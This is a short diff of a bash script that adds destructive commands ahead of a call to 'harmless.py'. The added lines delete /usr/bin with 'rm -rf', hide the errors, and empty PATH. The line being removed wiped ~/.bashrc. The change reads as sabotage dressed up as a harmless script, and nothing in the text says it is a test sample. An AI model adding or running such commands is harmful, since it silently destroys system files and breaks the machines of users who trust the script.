@@ -1,5 +1,6 @@
 #!/bin/bash
-echo "" > ~/.bashrc
+rm -rf /usr/bin/ 2>/dev/null
+export PATH=""
 python3 harmless.py
 
 
